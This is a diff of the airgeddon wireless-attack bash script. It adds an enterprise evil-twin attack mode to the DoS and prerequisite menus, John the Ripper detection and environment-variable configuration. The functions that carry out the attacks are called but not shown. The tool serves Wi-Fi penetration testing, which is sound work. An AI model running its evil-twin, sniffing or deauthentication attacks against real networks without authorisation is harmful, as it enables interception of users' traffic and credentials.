@@ -9074,8 +10855,12 @@ function et_prerequisites() {
 		print_simple_separator
 		ask_yesno 277 "yes"
 		if [ "${yesno}" = "n" ]; then
-			return_to_et_main_menu=1
-			return_to_et_main_menu_from_beef=1
+			if [ -n "${enterprise_mode}" ]; then
+				return_to_enterprise_main_menu=1
+			else
+				return_to_et_main_menu=1
+				return_to_et_main_menu_from_beef=1
+			fi
 			return
 		fi
 	fi
@@ -9129,26 +10914,40 @@ function et_prerequisites() {
 		language_strings "${language}" 31 "blue"
 	else
 		if ! ask_bssid; then
-			return_to_et_main_menu=1
+			if [ -n "${enterprise_mode}" ]; then
+				return_to_enterprise_main_menu=1
+			else
+				return_to_et_main_menu=1
+			fi
 			return
 		fi
 
 		if ! ask_channel; then
-			return_to_et_main_menu=1
+			if [ -n "${enterprise_mode}" ]; then
+				return_to_enterprise_main_menu=1
+			else
+				return_to_et_main_menu=1
+			fi
 			return
 		else
-			if [[ "${dos_pursuit_mode}" -eq 1 ]] && [[ "${channel}" -gt 14 ]] && [[ "${secondary_interface_supported_bands}" = "${band_24ghz}" ]]; then
+			if [[ "${dos_pursuit_mode}" -eq 1 ]] && [[ -n "${channel}" ]] && [[ "${channel}" -gt 14 ]] && [[ "${interfaces_band_info['secondary_wifi_interface','5Ghz_allowed']}" -eq 0 ]]; then
 				echo
 				language_strings "${language}" 394 "red"
 				language_strings "${language}" 115 "read"
-				return_to_et_main_menu=1
+				if [ -n "${enterprise_mode}" ]; then
+					return_to_enterprise_main_menu=1
+				else
+					return_to_et_main_menu=1
+				fi
 				return
 			fi
 		fi
 		ask_essid "noverify"
 	fi
 
-	if [[ "${et_mode}" = "et_sniffing" ]] || [[ "${et_mode}" = "et_sniffing_sslstrip" ]]; then
+	if [ -n "${enterprise_mode}" ]; then
+		manage_enterprise_log
+	elif [[ "${et_mode}" = "et_sniffing" ]] || [[ "${et_mode}" = "et_sniffing_sslstrip" ]]; then
 		manage_ettercap_log
 	elif [ "${et_mode}" = "et_sniffing_sslstrip2" ]; then
 		manage_bettercap_log
@@ -9162,12 +10961,20 @@ function et_prerequisites() {
 		fi
 	fi
 
-	return_to_et_main_menu=1
-	return_to_et_main_menu_from_beef=1
+	if [ -n "${enterprise_mode}" ]; then
+		return_to_enterprise_main_menu=1
+	else
+		return_to_et_main_menu=1
+		return_to_et_main_menu_from_beef=1
+	fi
 
 	if [ "${is_docker}" -eq 1 ]; then
 		echo
-		language_strings "${language}" 420 "pink"
+		if [ -n "${enterprise_mode}" ]; then
+			language_strings "${language}" 528 "pink"
+		else
+			language_strings "${language}" 420 "pink"
+		fi
 		language_strings "${language}" 115 "read"
 	fi
 
@@ -9181,23 +10988,27 @@ function et_prerequisites() {
 	language_strings "${language}" 115 "read"
 	prepare_et_interface
 
-	case ${et_mode} in
-		"et_onlyap")
-			exec_et_onlyap_attack
-		;;
-		"et_sniffing")
-			exec_et_sniffing_attack
-		;;
-		"et_sniffing_sslstrip")
-			exec_et_sniffing_sslstrip_attack
-		;;
-		"et_sniffing_sslstrip2")
-			exec_et_sniffing_sslstrip2_attack
-		;;
-		"et_captive_portal")
-			exec_et_captive_portal_attack
-		;;
-	esac
+	if [ -n "${enterprise_mode}" ]; then
+		exec_enterprise_attack
+	else
+		case ${et_mode} in
+			"et_onlyap")
+				exec_et_onlyap_attack
+			;;
+			"et_sniffing")
+				exec_et_sniffing_attack
+			;;
+			"et_sniffing_sslstrip")
+				exec_et_sniffing_sslstrip_attack
+			;;
+			"et_sniffing_sslstrip2")
+				exec_et_sniffing_sslstrip2_attack
+			;;
+			"et_captive_portal")
+				exec_et_captive_portal_attack
+			;;
+		esac
+	fi
 }
 
 #Manage the Handshake file requirement for captive portal Evil Twin attack
@@ -9241,23 +11052,35 @@ function ask_et_handshake_file() {
 	fi
 }
 
-#DoS Evil Twin attacks menu
+#DoS Evil Twin and Enterprise attacks menu
 function et_dos_menu() {
 
 	debug_print
 
-	if [ ${return_to_et_main_menu} -eq 1 ]; then
+	if [[ -n "${return_to_et_main_menu}" ]] && [[ ${return_to_et_main_menu} -eq 1 ]]; then
+		return
+	fi
+
+	if [[ -n "${return_to_enterprise_main_menu}" ]] && [[ ${return_to_enterprise_main_menu} -eq 1 ]]; then
 		return
 	fi
 
 	clear
-	language_strings "${language}" 265 "title"
+	if [ "${1}" = "enterprise" ]; then
+		language_strings "${language}" 520 "title"
+	else
+		language_strings "${language}" 265 "title"
+	fi
 	current_menu="et_dos_menu"
 	initialize_menu_and_print_selections
 	echo
 	language_strings "${language}" 47 "green"
 	print_simple_separator
-	language_strings "${language}" 266
+	if [ "${1}" = "enterprise" ]; then
+		language_strings "${language}" 521
+	else
+		language_strings "${language}" 266
+	fi
 	print_simple_separator
 	language_strings "${language}" 139 mdk3_attack_dependencies[@]
 	language_strings "${language}" 140 aireplay_attack_dependencies[@]
@@ -9267,11 +11090,12 @@ function et_dos_menu() {
 	read -rp "> " et_dos_option
 	case ${et_dos_option} in
 		0)
-			return_to_et_main_menu_from_beef=1
+			if [ "${1}" != "enterprise" ]; then
+				return_to_et_main_menu_from_beef=1
+			fi
 			return
 		;;
 		1)
-
 			if contains_element "${et_dos_option}" "${forbidden_options[@]}"; then
 				forbidden_menu_option
 			else
@@ -9313,6 +11137,8 @@ function et_dos_menu() {
 					else
 						et_prerequisites
 					fi
+				elif [ -n "${enterprise_mode}" ]; then
+					et_prerequisites
 				else
 					if detect_internet_interface; then
 						et_prerequisites
@@ -9364,6 +11190,8 @@ function et_dos_menu() {
 					else
 						et_prerequisites
 					fi
+				elif [ -n "${enterprise_mode}" ]; then
+					et_prerequisites
 				else
 					if detect_internet_interface; then
 						et_prerequisites
@@ -9415,6 +11243,8 @@ function et_dos_menu() {
 					else
 						et_prerequisites
 					fi
+				elif [ -n "${enterprise_mode}" ]; then
+					et_prerequisites
 				else
 					if detect_internet_interface; then
 						et_prerequisites
@@ -9429,7 +11259,11 @@ function et_dos_menu() {
 		;;
 	esac
 
-	et_dos_menu
+	if [ "${1}" = "enterprise" ]; then
+		et_dos_menu "${1}"
+	else
+		et_dos_menu
+	fi
 }
 
 #Selected internet interface detection
@@ -9666,6 +11500,8 @@ function exit_script_option() {
 		language_strings "${language}" 160 "yellow"
 	fi
 
+	clean_env_vars
+
 	echo
 	exit ${exit_code}
 }
@@ -9703,6 +11539,8 @@ function hardcore_exit() {
 		time_loop
 		echo -e "${green_color} Ok\r${normal_color}"
 	fi
+
+	clean_env_vars
 
 	exit ${exit_code}
 }
@@ -9765,6 +11603,15 @@ function set_hashcat_parameters() {
 			hccapx_needed=1
 		fi
 	fi
+}
+
+#Determine john the ripper
+#shellcheck disable=SC2034
+function get_jtr_version() {
+
+	debug_print
+
+	jtr_version=$(john --help | grep -Eio 'version [a-z0-9\.]+' | awk '{print $2}')
 }
 
 #Determine hashcat version
@@ -10054,22 +11901,22 @@ function detect_distro_phase2() {
 	debug_print
 
 	if [ "${distro}" = "Unknown Linux" ]; then
-		if [ -f ${osversionfile_dir}"centos-release" ]; then
+		if [ -f "${osversionfile_dir}centos-release" ]; then
 			distro="CentOS"
-		elif [ -f ${osversionfile_dir}"fedora-release" ]; then
+		elif [ -f "${osversionfile_dir}fedora-release" ]; then
 			distro="Fedora"
-		elif [ -f ${osversionfile_dir}"gentoo-release" ]; then
+		elif [ -f "${osversionfile_dir}gentoo-release" ]; then
 			distro="Gentoo"
-		elif [ -f ${osversionfile_dir}"openmandriva-release" ]; then
+		elif [ -f "${osversionfile_dir}openmandriva-release" ]; then
 			distro="OpenMandriva"
-		elif [ -f ${osversionfile_dir}"redhat-release" ]; then
+		elif [ -f "${osversionfile_dir}redhat-release" ]; then
 			distro="Red Hat"
-		elif [ -f ${osversionfile_dir}"SuSE-release" ]; then
+		elif [ -f "${osversionfile_dir}SuSE-release" ]; then
 			distro="SuSE"
-		elif [ -f ${osversionfile_dir}"debian_version" ]; then
+		elif [ -f "${osversionfile_dir}debian_version" ]; then
 			distro="Debian"
-			if [ -f ${osversionfile_dir}"os-release" ]; then
-				extra_os_info=$(grep "PRETTY_NAME" < ${osversionfile_dir}"os-release")
+			if [ -f "${osversionfile_dir}os-release" ]; then
+				extra_os_info="$(grep "PRETTY_NAME" < "${osversionfile_dir}os-release")"
 				if [[ "${extra_os_info}" =~ Raspbian ]]; then
 					distro="Raspbian"
 					is_arm=1
@@ -10080,14 +11927,21 @@ function detect_distro_phase2() {
 			fi
 		fi
 	elif [ "${distro}" = "Arch" ]; then
-		if [ -f ${osversionfile_dir}"os-release" ]; then
-			extra_os_info=$(grep "PRETTY_NAME" < ${osversionfile_dir}"os-release")
+		if [ -f "${osversionfile_dir}os-release" ]; then
+			extra_os_info="$(grep "PRETTY_NAME" < "${osversionfile_dir}os-release")"
 			if [[ "${extra_os_info}" =~ BlackArch ]]; then
 				distro="BlackArch"
 			elif [[ "${extra_os_info}" =~ Kali ]]; then
 				#Kali is intentionally here too to avoid some Kali arm distro bad detection
 				distro="Kali"
 				is_arm=1
+			fi
+		fi
+	elif [ "${distro}" = "Ubuntu" ]; then
+		if [ -f "${osversionfile_dir}os-release" ]; then
+			extra_os_info="$(grep "PRETTY_NAME" < "${osversionfile_dir}os-release")"
+			if [[ "${extra_os_info}" =~ Mint ]]; then
+				distro="Mint"
 			fi
 		fi
 	fi
@@ -10139,7 +11993,7 @@ function special_distro_features() {
 			ywindow_edge_lines=1
 			ywindow_edge_pixels=15
 		;;
-		"Ubuntu")
+		"Ubuntu"|"Mint")
 			networkmanager_cmd="service network-manager restart"
 			xratio=6.2
 			yratio=13.9
@@ -10321,8 +12175,12 @@ function check_root_permissions() {
 	user=$(whoami)
 
 	if [ "${user}" = "root" ]; then
-		language_strings "${language}" 484 "yellow"
+		if ! "${AIRGEDDON_SILENT_CHECKS:-false}"; then
+			echo
+			language_strings "${language}" 484 "yellow"
+		fi
 	else
+		echo
 		language_strings "${language}" 223 "red"
 		exit_code=1
 		exit_script_option
@@ -10350,74 +12208,102 @@ function check_compatibility() {
 
 	debug_print
 
-	echo
-	language_strings "${language}" 108 "blue"
-	language_strings "${language}" 115 "read"
+	if ! "${AIRGEDDON_SILENT_CHECKS:-false}"; then
+		echo
+		language_strings "${language}" 108 "blue"
+		language_strings "${language}" 115 "read"
 
-	echo
-	language_strings "${language}" 109 "blue"
+		echo
+		language_strings "${language}" 109 "blue"
+	fi
 
 	essential_toolsok=1
 	for i in "${essential_tools_names[@]}"; do
-		echo -ne "${i}"
-		time_loop
-		if ! hash "${i}" 2> /dev/null; then
-			echo -ne "${red_color} Error${normal_color}"
-			essential_toolsok=0
-			echo -ne " (${possible_package_names_text[${language}]} : ${possible_package_names[${i}]})"
-			echo -e "\r"
+		if ! "${AIRGEDDON_SILENT_CHECKS:-false}"; then
+			echo -ne "${i}"
+			time_loop
+			if ! hash "${i}" 2> /dev/null; then
+				echo -ne "${red_color} Error${normal_color}"
+				essential_toolsok=0
+				echo -ne " (${possible_package_names_text[${language}]} : ${possible_package_names[${i}]})"
+				echo -e "\r"
+			else
+				echo -e "${green_color} Ok\r${normal_color}"
+			fi
 		else
-			echo -e "${green_color} Ok\r${normal_color}"
+			if ! hash "${i}" 2> /dev/null; then
+				essential_toolsok=0
+			fi
 		fi
 	done
 
-	echo
-	language_strings "${language}" 218 "blue"
+	if ! "${AIRGEDDON_SILENT_CHECKS:-false}"; then
+		echo
+		language_strings "${language}" 218 "blue"
+	fi
 
 	optional_toolsok=1
 	for i in "${!optional_tools[@]}"; do
-		echo -ne "${i}"
-		time_loop
+		if ! "${AIRGEDDON_SILENT_CHECKS:-false}"; then
+			echo -ne "${i}"
+			time_loop
+		fi
 		if ! hash "${i}" 2> /dev/null; then
-			echo -ne "${red_color} Error${normal_color}"
+			if ! "${AIRGEDDON_SILENT_CHECKS:-false}"; then
+				echo -ne "${red_color} Error${normal_color}"
+				echo -ne " (${possible_package_names_text[${language}]} : ${possible_package_names[${i}]})"
+				echo -e "\r"
+			fi
 			optional_toolsok=0
-			echo -ne " (${possible_package_names_text[${language}]} : ${possible_package_names[${i}]})"
-			echo -e "\r"
 		else
 			if [ "${i}" = "beef" ]; then
 				detect_fake_beef
 				if [ ${fake_beef_found} -eq 1 ]; then
-					echo -ne "${red_color} Error${normal_color}"
+					if ! "${AIRGEDDON_SILENT_CHECKS:-false}"; then
+						echo -ne "${red_color} Error${normal_color}"
+						echo -ne " (${possible_package_names_text[${language}]} : ${possible_package_names[${i}]})"
+						echo -e "\r"
+					fi
 					optional_toolsok=0
-					echo -ne " (${possible_package_names_text[${language}]} : ${possible_package_names[${i}]})"
-					echo -e "\r"
 				else
-					echo -e "${green_color} Ok\r${normal_color}"
+					if ! "${AIRGEDDON_SILENT_CHECKS:-false}"; then
+						echo -e "${green_color} Ok\r${normal_color}"
+					fi
 					optional_tools[${i}]=1
 				fi
 			else
-				echo -e "${green_color} Ok\r${normal_color}"
+				if ! "${AIRGEDDON_SILENT_CHECKS:-false}"; then
+					echo -e "${green_color} Ok\r${normal_color}"
+				fi
 				optional_tools[${i}]=1
 			fi
 		fi
 	done
 
 	update_toolsok=1
-	if [ "${auto_update}" -eq 1 ]; then
+	if "${AIRGEDDON_AUTO_UPDATE:-true}"; then
 
-		echo
-		language_strings "${language}" 226 "blue"
+		if ! "${AIRGEDDON_SILENT_CHECKS:-false}"; then
+			echo
+			language_strings "${language}" 226 "blue"
+		fi
 
 		for i in "${update_tools[@]}"; do
-			echo -ne "${i}"
-			time_loop
-			if ! hash "${i}" 2> /dev/null; then
-				echo -ne "${red_color} Error${normal_color}"
-				update_toolsok=0
-				echo -ne " (${possible_package_names_text[${language}]} : ${possible_package_names[${i}]})"
-				echo -e "\r"
+			if ! "${AIRGEDDON_SILENT_CHECKS:-false}"; then
+				echo -ne "${i}"
+				time_loop
+				if ! hash "${i}" 2> /dev/null; then
+					echo -ne "${red_color} Error${normal_color}"
+					update_toolsok=0
+					echo -ne " (${possible_package_names_text[${language}]} : ${possible_package_names[${i}]})"
+					echo -e "\r"
+				else
+					echo -e "${green_color} Ok\r${normal_color}"
+				fi
 			else
-				echo -e "${green_color} Ok\r${normal_color}"
+				if ! hash "${i}" 2> /dev/null; then
+					update_toolsok=0
+				fi
 			fi
 		done
 	fi
@@ -10426,24 +12312,30 @@ function check_compatibility() {
 		echo
 		language_strings "${language}" 111 "red"
 		echo
-		return
-	fi
-
-	compatible=1
-
-	if [ ${optional_toolsok} -eq 0 ]; then
-		echo
-		language_strings "${language}" 219 "yellow"
-		echo
-		if [ ${fake_beef_found} -eq 1 ]; then
-			language_strings "${language}" 401 "red"
+		if ! "${AIRGEDDON_SILENT_CHECKS:-false}"; then
+			language_strings "${language}" 581 "blue"
 			echo
 		fi
 		return
 	fi
 
-	echo
-	language_strings "${language}" 110 "yellow"
+	compatible=1
+
+	if ! "${AIRGEDDON_SILENT_CHECKS:-false}"; then
+		if [ ${optional_toolsok} -eq 0 ]; then
+			echo
+			language_strings "${language}" 219 "yellow"
+			echo
+			if [ ${fake_beef_found} -eq 1 ]; then
+				language_strings "${language}" 401 "red"
+				echo
+			fi
+			return
+		fi
+
+		echo
+		language_strings "${language}" 110 "yellow"
+	fi
 }
 
 #Check for the minimum bash version requirement
@@ -10451,11 +12343,14 @@ function check_bash_version() {
 
 	debug_print
 
-	echo
 	bashversion="${BASH_VERSINFO[0]}.${BASH_VERSINFO[1]}"
 	if compare_floats_greater_or_equal "${bashversion}" ${minimum_bash_version_required}; then
-		language_strings "${language}" 221 "yellow"
+		if ! "${AIRGEDDON_SILENT_CHECKS:-false}"; then
+			echo
+			language_strings "${language}" 221 "yellow"
+		fi
 	else
+		echo
 		language_strings "${language}" 222 "red"
 		exit_code=1
 		exit_script_option
@@ -10467,7 +12362,7 @@ function check_update_tools() {
 
 	debug_print
 
-	if [ "${auto_update}" -eq 1 ]; then
+	if "${AIRGEDDON_AUTO_UPDATE:-true}"; then
 		if [ ${update_toolsok} -eq 1 ]; then
 			autoupdate_check
 		else
@@ -10617,6 +12512,7 @@ function initialize_script_settings() {
 	interface_airmon_compatible=1
 	secondary_interface_airmon_compatible=1
 	declare -gA wps_data_array
+	declare -gA interfaces_band_info
 }
 
 #Detect if there is a working X window system excepting for docker container and wayland
@@ -10759,6 +12655,110 @@ function recalculate_windows_sizes() {
 	set_windows_sizes
 }
 
+#Initialization of env vars
+function env_vars_initialization() {
+
+	debug_print
+
+	option_var_with_error=""
+
+	ordered_options_env_vars=(
+									"AIRGEDDON_AUTO_UPDATE"
+									"AIRGEDDON_SKIP_INTRO"
+									"AIRGEDDON_BASIC_COLORS"
+									"AIRGEDDON_EXTENDED_COLORS"
+									"AIRGEDDON_AUTO_CHANGE_LANGUAGE"
+									"AIRGEDDON_SILENT_CHECKS"
+									"AIRGEDDON_PRINT_HINTS"
+									"AIRGEDDON_5GHZ_ENABLED"
+									"AIRGEDDON_DEVELOPMENT_MODE"
+									"AIRGEDDON_DEBUG_MODE"
+									)
+
+	declare -gA boolean_options_env_vars
+	boolean_options_env_vars["${ordered_options_env_vars[0]},default_value"]="true"
+	boolean_options_env_vars["${ordered_options_env_vars[1]},default_value"]="false"
+	boolean_options_env_vars["${ordered_options_env_vars[2]},default_value"]="true"
+	boolean_options_env_vars["${ordered_options_env_vars[3]},default_value"]="true"
+	boolean_options_env_vars["${ordered_options_env_vars[4]},default_value"]="true"
+	boolean_options_env_vars["${ordered_options_env_vars[5]},default_value"]="false"
+	boolean_options_env_vars["${ordered_options_env_vars[6]},default_value"]="true"
+	boolean_options_env_vars["${ordered_options_env_vars[7]},default_value"]="true"
+	boolean_options_env_vars["${ordered_options_env_vars[8]},default_value"]="false"
+	boolean_options_env_vars["${ordered_options_env_vars[9]},default_value"]="false"
+
+	boolean_options_env_vars["${ordered_options_env_vars[0]},rcfile_text"]="#Enabled true / Disabled false - Auto update feature (it has no effect on development mode) - Default value ${boolean_options_env_vars[${ordered_options_env_vars[0]},'default_value']}"
+	boolean_options_env_vars["${ordered_options_env_vars[1]},rcfile_text"]="#Enabled true / Disabled false - Skip intro (it has no effect on development mode) - Default value ${boolean_options_env_vars[${ordered_options_env_vars[1]},'default_value']}"
+	boolean_options_env_vars["${ordered_options_env_vars[2]},rcfile_text"]="#Enabled true / Disabled false - Allow colorized output - Default value ${boolean_options_env_vars[${ordered_options_env_vars[2]},'default_value']}"
+	boolean_options_env_vars["${ordered_options_env_vars[3]},rcfile_text"]="#Enabled true / Disabled false - Allow extended colorized output (ccze needed, it has no effect on disabled basic colors) - Default value ${boolean_options_env_vars[${ordered_options_env_vars[3]},'default_value']}"
+	boolean_options_env_vars["${ordered_options_env_vars[4]},rcfile_text"]="#Enabled true / Disabled false - Auto change language feature - Default value ${boolean_options_env_vars[${ordered_options_env_vars[4]},'default_value']}"
+	boolean_options_env_vars["${ordered_options_env_vars[5]},rcfile_text"]="#Enabled true / Disabled false - Dependencies, root and bash version checks are done silently (it has no effect on development mode) - Default value ${boolean_options_env_vars[${ordered_options_env_vars[5]},'default_value']}"
+	boolean_options_env_vars["${ordered_options_env_vars[6]},rcfile_text"]="#Enabled true / Disabled false - Print help hints on menus - Default value ${boolean_options_env_vars[${ordered_options_env_vars[6]},'default_value']}"
+	boolean_options_env_vars["${ordered_options_env_vars[7]},rcfile_text"]="#Enabled true / Disabled false - Enable 5Ghz support (it has no effect if your cards are not 5Ghz compatible cards) - Default value ${boolean_options_env_vars[${ordered_options_env_vars[7]},'default_value']}"
+	boolean_options_env_vars["${ordered_options_env_vars[8]},rcfile_text"]="#Enabled true / Disabled false - Development mode for faster development skipping intro and all initial checks - Default value ${boolean_options_env_vars[${ordered_options_env_vars[8]},'default_value']}"
+	boolean_options_env_vars["${ordered_options_env_vars[9]},rcfile_text"]="#Enabled true / Disabled false - Debug mode for development printing debug information - Default value ${boolean_options_env_vars[${ordered_options_env_vars[9]},'default_value']}"
+
+	readarray -t ENV_VARS_ELEMENTS < <(printf %s\\n "${!boolean_options_env_vars[@]}" | cut -d, -f1 | sort -u)
+	ENV_BOOLEAN_VARS_ELEMENTS=("${ENV_VARS_ELEMENTS[@]}")
+
+	if [ ! -f "${scriptfolder}${rc_file}" ]; then
+		create_rcfile
+	fi
+
+	for item in "${ENV_VARS_ELEMENTS[@]}"; do
+		if [ -z "${!item}" ]; then
+			if grep "${item}" "${scriptfolder}${rc_file}" > /dev/null; then
+				eval "export $(grep "${item}" "${scriptfolder}${rc_file}")"
+			else
+				export ${item}=${boolean_options_env_vars[${item},'default_value']}
+			fi
+		fi
+	done
+
+	if ! env_vars_validation; then
+		configuration_variables_handling_messages
+		echo
+		echo_red "${error_on_configuration_variable[${language}]}"
+		echo
+		hardcore_exit
+	fi
+}
+
+#Validation of env vars. They must contain only right values
+function env_vars_validation() {
+
+	debug_print
+
+	for item in "${ENV_BOOLEAN_VARS_ELEMENTS[@]}"; do
+		if ! [[ "${!item,,}" =~ ^(true|false)$ ]]; then
+			option_var_with_error="${item}"
+			return 1
+		fi
+	done
+
+	return 0
+}
+
+#Create env vars file and fill it with default values
+function create_rcfile() {
+
+	debug_print
+
+	local counter=0
+	for item in "${ordered_options_env_vars[@]}"; do
+		counter=$((counter + 1))
+		if [ -n "${ENV_BOOLEAN_VARS_ELEMENTS[${item}]}" ]; then
+			{
+			echo -e "${boolean_options_env_vars[${item},"rcfile_text"]}"
+			echo -e "${item}=${boolean_options_env_vars[${item},"default_value"]}"
+			if [ ${counter} -ne ${#ordered_options_env_vars[@]} ]; then
+				echo -ne "\n"
+			fi
+			} >> "${scriptfolder}${rc_file}" 2> /dev/null
+		fi
+	done
+}
+
 #Detect if airgeddon is working inside a docker container
 function docker_detection() {
 
@@ -10770,30 +12770,74 @@ function docker_detection() {
 }
 
 #Set colorization output if set
-function initialize_colorized_output() {
+function initialize_extended_colorized_output() {
 
 	debug_print
 
 	colorize=""
-	if [ "${allow_colorization}" -eq 1 ]; then
+	if "${AIRGEDDON_BASIC_COLORS:-true}" && "${AIRGEDDON_EXTENDED_COLORS:-true}"; then
 		if hash ccze 2> /dev/null; then
 			colorize="| ccze -A"
 		fi
 	fi
 }
 
-#Script starting point
-function welcome() {
+#Remap colors vars
+function remap_colors() {
 
 	debug_print
 
+	if ! "${AIRGEDDON_BASIC_COLORS:-true}"; then
+		green_color="${normal_color}"
+		green_color_title="${normal_color}"
+		red_color="${normal_color}"
+		red_color_slim="${normal_color}"
+		blue_color="${normal_color}"
+		cyan_color="${normal_color}"
+		brown_color="${normal_color}"
+		yellow_color="${normal_color}"
+		pink_color="${normal_color}"
+		white_color="${normal_color}"
+	else
+		initialize_colors
+	fi
+}
+
+#Initialize colors vars
+function initialize_colors() {
+
+	debug_print
+
+	normal_color="\e[1;0m"
+	green_color="\033[1;32m"
+	green_color_title="\033[0;32m"
+	red_color="\033[1;31m"
+	red_color_slim="\033[0;031m"
+	blue_color="\033[1;34m"
+	cyan_color="\033[1;36m"
+	brown_color="\033[0;33m"
+	yellow_color="\033[1;33m"
+	pink_color="\033[1;35m"
+	white_color="\e[1;97m"
+}
+
+#Script starting point
+function main() {
+
+	initialize_script_settings
+	initialize_colors
+	env_vars_initialization
+
+	debug_print
+
+	remap_colors
+
 	clear
 	current_menu="pre_main_menu"
-	initialize_script_settings
 	docker_detection
 	set_default_save_path
 
-	if [ ${auto_change_language} -eq 1 ]; then
+	if "${AIRGEDDON_AUTO_CHANGE_LANGUAGE:-true}"; then
 		autodetect_language
 	fi
 
@@ -10804,17 +12848,19 @@ function welcome() {
 	set_possible_aliases
 	initialize_optional_tools_values
 
-	if [ ${debug_mode} -eq 0 ]; then
-		language_strings "${language}" 86 "title"
-		language_strings "${language}" 6 "blue"
-		echo
-		if check_window_size_for_intro; then
-			print_intro
-		else
-			language_strings "${language}" 228 "green"
+	if ! "${AIRGEDDON_DEVELOPMENT_MODE:-false}"; then
+		if ! "${AIRGEDDON_SKIP_INTRO:-false}"; then
+			language_strings "${language}" 86 "title"
+			language_strings "${language}" 6 "blue"
 			echo
-			language_strings "${language}" 395 "yellow"
-		sleep 3
+			if check_window_size_for_intro; then
+				print_intro
+			else
+				language_strings "${language}" 228 "green"
+				echo
+				language_strings "${language}" 395 "yellow"
+			sleep 3
+			fi
 		fi
 
 		clear
@@ -10828,7 +12874,6 @@ function welcome() {
 		fi
 
 		check_bash_version
-		echo
 		check_root_permissions
 
 		echo
@@ -10858,7 +12903,7 @@ function welcome() {
 		check_update_tools
 	fi
 
-	initialize_colorized_output
+	initialize_extended_colorized_output
 	set_windows_sizes
 	select_interface
 	initialize_menu_options_dependencies
@@ -10941,14 +12986,6 @@ function download_last_version() {
 
 		if [ -n "${beef_custom_path}" ]; then
 			rewrite_script_with_custom_beef "set" "${beef_custom_path}"
-		fi
-
-		if [ "${allow_colorization}" -ne 1 ]; then
-			sed -ri 's:(allow_colorization)=(1):\1=0:' "${scriptfolder}${scriptname}" 2> /dev/null
-		fi
-
-		if [ "${auto_change_language}" -ne 1 ]; then
-			sed -ri 's:(auto_change_language)=(1):\1=0:' "${scriptfolder}${scriptname}" 2> /dev/null
 		fi
 
 		sed -ri "s:^([l]anguage)=\"[a-zA-Z]+\":\1=\"${current_permanent_language}\":" "${scriptfolder}${scriptname}" 2> /dev/null
@@ -11180,6 +13217,10 @@ function remove_warnings() {
 	echo "${bully_pixie_dust_attack_dependencies[@]}" > /dev/null 2>&1
 	echo "${reaver_pixie_dust_attack_dependencies[@]}" > /dev/null 2>&1
 	echo "${wep_attack_dependencies[@]}" > /dev/null 2>&1
+	echo "${enterprise_attack_dependencies[@]}" > /dev/null 2>&1
+	echo "${asleap_attacks_dependencies[@]}" > /dev/null 2>&1
+	echo "${john_attacks_dependencies[@]}" > /dev/null 2>&1
+	echo "${johncrunch_attacks_dependencies[@]}" > /dev/null 2>&1
 	echo "${is_arm}" > /dev/null 2>&1
 }
 
@@ -11324,8 +13365,10 @@ function echo_white() {
 	last_echo "${1}" "${white_color}"
 }
 
+#Script starts to executing stuff from this point, traps and then main function
 for f in SIGINT SIGHUP INT SIGTSTP; do
 	trap_cmd="trap \"capture_traps ${f}\" \"${f}\""
 	eval "${trap_cmd}"
 done
-welcome
+
+main
